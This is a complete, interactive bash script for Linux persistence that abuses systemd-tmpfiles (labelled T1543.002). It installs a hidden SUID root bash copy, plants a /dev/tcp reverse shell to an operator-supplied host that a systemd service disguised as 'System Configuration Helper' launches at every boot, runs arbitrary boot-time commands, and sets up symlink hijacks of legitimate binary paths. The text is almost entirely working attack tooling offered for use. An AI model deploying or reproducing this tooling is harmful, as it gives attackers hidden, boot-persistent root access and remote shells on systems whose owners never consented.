#!/bin/bash
# Tmpfiles.d Persistence (T1543.002)
# Creates files/symlinks/sets permissions at boot via systemd-tmpfiles
# Runs BEFORE most services — extremely early execution

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; NC='\033[0m'
MARKER="d3m0n_tmpfiles"
CONF_NAME="10-${MARKER}.conf"

banner() {
    echo -e "${RED}"
    echo " ╔══════════════════════════════════════════════════════╗"
    echo " ║       Tmpfiles.d Persistence (T1543.002)             ║"
    echo " ║  Executes BEFORE services via systemd-tmpfiles       ║"
    echo " ║  Creates: files, dirs, symlinks, sets perms at boot  ║"
    echo " ╚══════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

find_tmpfilesd_dir() {
    for d in /etc/tmpfiles.d /run/tmpfiles.d; do
        [ -d "$d" ] && echo "$d" && return
    done
    # Try to create if /etc is writable
    mkdir -p /etc/tmpfiles.d 2>/dev/null && echo "/etc/tmpfiles.d" && return
    echo ""
}

install_suid_bash() {
    # Create a SUID root shell via tmpfiles.d — fires at boot
    local DIR; DIR=$(find_tmpfilesd_dir)
    [ -z "$DIR" ] && { echo -e "${RED}[-] No tmpfiles.d directory found${NC}"; return; }

    local PAYLOAD_PATH="/usr/local/bin/.sysutil"
    cp /bin/bash "$PAYLOAD_PATH" 2>/dev/null || { echo -e "${RED}[-] Cannot copy bash${NC}"; return; }

    cat > "${DIR}/${CONF_NAME}" << EOF
# ${MARKER}
# f = create file, z = set security, m = set mode
f  ${PAYLOAD_PATH}  4755  root  root  -  -
EOF
    echo -e "${GREEN}[+] Config: ${DIR}/${CONF_NAME}${NC}"
    echo -e "${GREEN}[+] On next boot: ${PAYLOAD_PATH} will be SUID root${NC}"
    echo -e "${YELLOW}[!] Access: ${PAYLOAD_PATH} -p -i (SUID bash shell)${NC}"

    # Apply immediately
    systemd-tmpfiles --create "${DIR}/${CONF_NAME}" 2>/dev/null && \
        echo -e "${GREEN}[+] Applied immediately${NC}"
}

install_symlink_hijack() {
    # Create a symlink that hijacks a legit binary path
    local TARGET="$1" DEST="$2"
    local DIR; DIR=$(find_tmpfilesd_dir)
    [ -z "$DIR" ] && { echo -e "${RED}[-] No tmpfiles.d directory found${NC}"; return; }

    cat > "${DIR}/${CONF_NAME}" << EOF
# ${MARKER}
L+  ${TARGET}  -  -  -  -  ${DEST}
EOF
    echo -e "${GREEN}[+] Symlink config: ${TARGET} → ${DEST}${NC}"
    systemd-tmpfiles --create "${DIR}/${CONF_NAME}" 2>/dev/null && \
        echo -e "${GREEN}[+] Applied immediately${NC}"
}

install_payload_file() {
    # Write an arbitrary file to disk at boot (recreated even if deleted)
    local DEST_PATH="$1" PAYLOAD="$2"
    local DIR; DIR=$(find_tmpfilesd_dir)
    [ -z "$DIR" ] && { echo -e "${RED}[-] No tmpfiles.d directory found${NC}"; return; }

    # Write payload to a hidden location
    local HIDDEN="/usr/local/lib/.${MARKER}"
    printf '#!/bin/sh\n# %s\n%s\n' "$MARKER" "$PAYLOAD" > "$HIDDEN"
    chmod 755 "$HIDDEN"

    cat > "${DIR}/${CONF_NAME}" << EOF
# ${MARKER}
f   ${DEST_PATH}   0755  root  root   -
z   ${DEST_PATH}   0755  root  root   -
EOF
    echo -e "${GREEN}[+] Payload file config: ${DEST_PATH}${NC}"
    echo -e "${YELLOW}[!] File recreated on every boot even if deleted${NC}"
    systemd-tmpfiles --create "${DIR}/${CONF_NAME}" 2>/dev/null
}

install_revshell() {
    local LHOST="$1" LPORT="$2"
    local DIR; DIR=$(find_tmpfilesd_dir)
    [ -z "$DIR" ] && { echo -e "${RED}[-] No tmpfiles.d directory found${NC}"; return; }

    local HIDDEN="/usr/local/lib/.${MARKER}.sh"
    printf '#!/bin/sh\n# %s\nnohup /bin/bash -c "bash -i >& /dev/tcp/%s/%s 0>&1" >/dev/null 2>&1 &\n' \
        "$MARKER" "$LHOST" "$LPORT" > "$HIDDEN"
    chmod 755 "$HIDDEN"

    # Use 'v' (verbose create directory if not exists) + 'f' for the script
    cat > "${DIR}/${CONF_NAME}" << EOF
# ${MARKER}
d   /usr/local/lib   0755   root  root  -
f   ${HIDDEN}   0755   root  root  -
C   ${HIDDEN}   -      -     -     -    ${HIDDEN}
EOF

    # Also add a systemd service that runs tmpfiles-setup triggers it
    local SVCDIR="/etc/systemd/system"
    cat > "${SVCDIR}/${MARKER}.service" << EOF
[Unit]
Description=System Configuration Helper
After=systemd-tmpfiles-setup.service
# ${MARKER}

[Service]
Type=oneshot
ExecStart=${HIDDEN}
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
EOF
    systemctl daemon-reload 2>/dev/null
    systemctl enable "${MARKER}.service" 2>/dev/null

    echo -e "${GREEN}[+] Tmpfiles.d config: ${DIR}/${CONF_NAME}${NC}"
    echo -e "${GREEN}[+] Systemd service: ${SVCDIR}/${MARKER}.service${NC}"
    echo -e "${YELLOW}[!] Fires at every boot via systemd-tmpfiles-setup + service${NC}"
}

install_custom() {
    local CMD="$1"
    local DIR; DIR=$(find_tmpfilesd_dir)
    [ -z "$DIR" ] && { echo -e "${RED}[-] No tmpfiles.d directory found${NC}"; return; }

    local HIDDEN="/usr/local/lib/.${MARKER}.sh"
    printf '#!/bin/sh\n# %s\n%s >/dev/null 2>&1 &\n' "$MARKER" "$CMD" > "$HIDDEN"
    chmod 755 "$HIDDEN"

    local SVCDIR="/etc/systemd/system"
    cat > "${SVCDIR}/${MARKER}.service" << EOF
[Unit]
Description=System Configuration Helper
After=systemd-tmpfiles-setup.service
# ${MARKER}

[Service]
Type=oneshot
ExecStart=${HIDDEN}
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
EOF
    systemctl daemon-reload 2>/dev/null
    systemctl enable "${MARKER}.service" 2>/dev/null
    echo -e "${GREEN}[+] Custom command installed${NC}"
}

list_installed() {
    echo -e "${YELLOW}[*] Tmpfiles.d configs:${NC}"
    find /etc/tmpfiles.d /run/tmpfiles.d /usr/lib/tmpfiles.d \
        -name "*${MARKER}*" 2>/dev/null | while read -r f; do echo "  $f"; done
    echo -e "${YELLOW}[*] Systemd services:${NC}"
    find /etc/systemd/system -name "*${MARKER}*" 2>/dev/null | while read -r f; do echo "  $f"; done
}

cleanup() {
    echo -e "${YELLOW}[*] Cleaning...${NC}"
    find /etc/tmpfiles.d /run/tmpfiles.d /usr/lib/tmpfiles.d \
        -name "*${MARKER}*" -delete 2>/dev/null
    systemctl disable "${MARKER}.service" 2>/dev/null
    rm -f "/etc/systemd/system/${MARKER}.service"
    rm -f "/usr/local/lib/.${MARKER}"*
    rm -f "/usr/local/bin/.sysutil"
    systemctl daemon-reload 2>/dev/null
    echo -e "${GREEN}[+] Cleaned${NC}"
}

banner
[[ $EUID -ne 0 ]] && { echo -e "${RED}[-] Root required.${NC}"; exit 1; }
command -v systemd-tmpfiles >/dev/null 2>&1 || { echo -e "${RED}[-] systemd-tmpfiles not found${NC}"; exit 1; }

echo -e "  ${YELLOW}[1]${NC} SUID root shell (recreated at every boot)"
echo -e "  ${YELLOW}[2]${NC} Reverse shell (via tmpfiles + systemd service)"
echo -e "  ${YELLOW}[3]${NC} Custom command"
echo -e "  ${YELLOW}[4]${NC} Symlink hijack (path redirect)"
echo -e "  ${YELLOW}[5]${NC} List installed"
echo -e "  ${YELLOW}[6]${NC} Cleanup"
echo ""
read -rp "Choice: " OPT

case "$OPT" in
    1) install_suid_bash ;;
    2)
        read -rp "LHOST: " LHOST; read -rp "LPORT: " LPORT
        install_revshell "$LHOST" "$LPORT"
        ;;
    3)
        read -rp "Command: " CMD
        install_custom "$CMD"
        ;;
    4)
        read -rp "Symlink target (hijacked path): " TGT
        read -rp "Points to (real payload): " DEST
        install_symlink_hijack "$TGT" "$DEST"
        ;;
    5) list_installed ;;
    6) cleanup ;;
    *) echo -e "${RED}[-] Invalid option${NC}" ;;
esac
